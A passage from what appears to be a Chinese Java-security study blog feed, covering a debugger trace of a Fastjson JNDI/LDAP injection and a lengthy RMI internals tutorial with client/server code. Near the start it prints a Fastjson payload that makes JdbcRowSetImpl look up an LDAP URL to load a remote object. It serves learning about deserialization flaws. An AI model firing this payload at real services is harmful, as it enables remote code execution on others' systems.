class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119836.png"></p><h5 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h5><p>在这里下断点调试</p><p>首先还是经过 lookup 的方法调用</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119597.png"></p><p><strong>InitialContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119493.png"></p><p><strong>ldapURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119211.png"></p><p><strong>ldapURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119982.png"></p><p><strong>GenericURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119690.png"></p><p><strong>GenericURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119370.png"></p><p><strong>PartialCompositeContext.lookup.p_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119175.png"></p><p><strong>ComponentContext.p_lookup.c_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119759.png"></p><p><strong>LdapCtx.c_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119325.png"></p><p>从上面是通过 p_lookup.c_lookup 进入到  <strong>decodeObject</strong> 中，这里是重点要关注的，</p><p><strong>decodeObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119733.png"></p><p>进入 <strong>decodeObject</strong>，先要进入一个 getURLClassLoader ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119691.png"></p><p>getURLClassLoader 中的 trustURLCodebase 默认是 false ,不执行 newInstance 实例化，这里虽然已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119731.png"></p><p>接着往下走，来到了 deserializaObject ，</p><p><strong>decodeObject.deserializaObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120786.png"></p><p>而 deserializaObject 对象中恰好有 readObject ，字节码在此处被反序列化造成漏洞。</p><p><strong>deserializaObject.readObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120465.png"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap</a></p><p><a href="http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/">http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/</a></p><p><a href="https://www.bilibili.com/video/BV1ct4y1h79t">https://www.bilibili.com/video/BV1ct4y1h79t</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2025/09/20/RMI/"/>
    <url>/2025/09/20/RMI/</url>
    
    <content type="html"><![CDATA[<h2 id="1、RMI是什么"><a href="#1、RMI是什么" class="headerlink" title="1、RMI是什么"></a>1、RMI是什么</h2><blockquote><p>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：</p><p>优点：避免重复造轮子；</p><p>缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；</p><p>在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png"></p><h2 id="2、RMI-基本实现"><a href="#2、RMI-基本实现" class="headerlink" title="2、RMI 基本实现"></a>2、RMI 基本实现</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException, NotBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png"></p><h2 id="3、流程原理"><a href="#3、流程原理" class="headerlink" title="3、流程原理"></a>3、流程原理</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png"></p><h3 id="3-1-服务端-创建远程服务"><a href="#3-1-服务端-创建远程服务" class="headerlink" title="3.1 服务端-创建远程服务"></a>3.1 服务端-创建远程服务</h3><p>调试分析远程对象的创建过程：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png"></p><p>进入其构造函数，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png"></p><p>**UnicastRemoteObject **中 ，port 被默认赋值为 0</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png"></p><p>步入  UnicastRemoteObject  类中的 <strong>exportObject</strong> （姑且称为导出对象函数）</p><ul><li><font style="color:#080808;background-color:#ffffff;">public static</font>：不需要创建 UnicastRemoteObject  实例也可以调用<ul><li><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png"></li></ul></li><li>Remote obj：实现了 java.rmi.Remote 接口的对象，</li><li>int port： 接收客户端的请求</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png"></p><p>接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的  <font style="color:#080808;background-color:#ffffff;">new UnicastServerRef(port))，</font><strong><font style="color:#080808;background-color:#ffffff;">UnicastServerRef</font></strong><font style="color:#080808;background-color:#ffffff;">（称之为服务端引用）</font></p><p><font style="color:#080808;background-color:#ffffff;">var 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 </font><strong><font style="color:#080808;background-color:#ffffff;">LiveRef</font></strong><font style="color:#080808;background-color:#ffffff;">,</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png"></p><p>来到 LiveRef 的构造函数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png"></p><p>这里可以看一下 getLocalEndpoint</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png"></p><p>这里的 <strong>TCPEndpoint</strong> 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png"></p><p>继续跟入 <font style="color:#080808;background-color:#ffffff;">this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 </font>this，在此处 ep 中有了IP和端口信息</p><ul><li>Endpoint ep    端点信息（IP、端口、socket）</li><li>Channel ch     通信通道（缓存的连接）</li><li>isLoacl    是否为本地对象</li></ul><p>然后这些信息都被存放在 LiveRef 中。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png"></p><p>接下来又调用了父类方法并将 ref 赋值为 var1（var1:<strong>LiveRef@626</strong>）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png"></p><p>接下来回到  <font style="color:#080808;background-color:#ffffff;">return exportObject(obj, new UnicastServerRef(port)); 中的  exportObject 方法</font></p><p><font style="color:#080808;background-color:#ffffff;">首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。</font></p><p><font style="color:#080808;background-color:#ffffff;">之后都使用 sref.exportObject 进行工作完成导出远程对象的操作</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png"></p><p>而 sref 中封装着 LiveRef@626</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png"></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><p><strong><font style="color:#080808;background-color:#ffffff;">sref.exportObject </font></strong> 的执行过程：</p><p><code>stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code>这一步是创建<strong>客户端代理</strong>的过程。</p><blockquote><p>（为什么要在服务端创建客户端代理呢？）</p><p>这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png"></p></blockquote><p>步入 createProxy</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png"></p><p>clientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png"></p><p>此处进行了判断：</p><ul><li>forceStubUse：如果为 <code>true</code>，就强制使用旧的 <strong>静态 Stub 类</strong>（由 <code>rmic</code> 工具生成的 <code>_Stub.class</code>）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 <code>createStub(...)</code> 去加载和实例化 Stub</li><li>ignoreStubClasses：如果为 <code>true</code>，表示忽略静态 Stub 类。这时会尝试用 <strong>动态代理</strong>（<code>java.lang.reflect.Proxy</code>）来生成 Stub</li><li>stubClassExists：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>    <span class="hljs-comment">//先看缓存：withoutStubs 用来存放 “已经确定没有 Stub 的类”</span><br>    <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//尝试用 Class.forName 加载 [远程类名 + &quot;_Stub&quot;] 这个类</span><br>            Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                          <span class="hljs-literal">false</span>,<br>                          remoteClass.getClassLoader());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//如果能加载成功，说明确实存在 Stub 类</span><br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            <span class="hljs-comment">// 如果加载不到，说明这个远程类没有对应的 &quot;_Stub&quot;</span><br>            <span class="hljs-comment">//  那么就把它记到 withoutStubs 缓存里，下次查询就直接返回 false</span><br>            withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//如果缓存里已有，或者加载失败，就返回 false</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果要进入 createStub ，<strong>强制使用 Stub</strong><code>forceStubUse == true</code>，<strong>没有忽略 Stub 并且存在 Stub 类</strong><code>ignoreStubClasses == false``stubClassExists(remoteClass) == true</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png"></p><p>下一步创建动态代理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png"></p><p>其中的 handler 存放 LiveRef@783</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png"></p><p>这样就创建好了动态代理 <strong>stub</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png"></p><p>进入 Target （实际上是将目前创建的东西都封装到一起）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png"></p><p><strong>客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png"></p><p>接下来，将封装好的 target 发布出去</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png"></p><p>跟到了 TCPTransport 类中的 exportObject</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png"></p><p>listen() 函数先获取 <strong>TCPEndpoint@823</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png"></p><p>准备创建 ServerSocket</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png"></p><p>判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (listenPort == <span class="hljs-number">0</span>)<br>    setDefaultPort(server.getLocalPort(), csf, ssf);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png"></p><p>进入 server.getLocalPort </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png"></p><p>在这个函数中端口被赋值，此端口随机，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png"></p><p>这个时候的端口被赋值为 55685</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png"></p><ul><li>doPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。 </li><li>NewThreadAction： 创建一个新的线程</li></ul><p>这个线程开启之后等待客户端的连接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png"></p><p>做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png"></p><p>最后返回一些值，完成了服务端的发布过程。</p><p>到这里在返回看 <strong>exportObject 函数的作用</strong>：</p><ul><li>静态方法的 <font style="color:#080808;background-color:#ffffff;">exportObject 传入俩个参数，创建一个 UnicastServerRef 对象 sref ，sref 中封装了IP、端口等信息，核心是 LiveRef@xxx，然后调用 exportObject(obj, sref)</font></li><li><font style="color:#080808;background-color:#ffffff;">重载方法的 exportObject 返回代理对象 stub</font></li><li>这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png"></p><h3 id="3-2-注册中心-创建注册中心-绑定"><a href="#3-2-注册中心-创建注册中心-绑定" class="headerlink" title="3.2 注册中心-创建注册中心+绑定"></a>3.2 注册中心-创建注册中心+绑定</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png"></p><p>调用 createRegistry  创建注册中心，默认端口号为1099</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png"></p><p>到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png"></p><p>来到这一步：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png"></p><p>创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png"></p><h3 id="3-3-客户端-请求注册中心"><a href="#3-3-客户端-请求注册中心" class="headerlink" title="3.3 客户端-请求注册中心"></a>3.3 客户端-请求注册中心</h3><p>首先连接注册中心，接收传入的IP和端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png"></p><p>使用LIveRef ，将传入的 host,port,等封装</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png"></p><p>再次调用 <font style="color:#080808;background-color:#ffffff;">createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png"></p><p>来到下一步：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png"></p><h4 id="问题：在动态调试时遇到报错，可能是服务端没有开启！"><a href="#问题：在动态调试时遇到报错，可能是服务端没有开启！" class="headerlink" title="问题：在动态调试时遇到报错，可能是服务端没有开启！"></a>问题：在动态调试时遇到报错，可能是服务端没有开启！</h4><p>下一步调用会报以下错误，因为服务端没有开启监听</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png"></p><p>将 RMIServer 运行起来就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png"></p><p>这里看到传进来的 var1 实际上就是<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>中的 <code>remoteObj</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//创建远程调用对象</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//序列化参数，将 var1 写入输出流</span><br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>   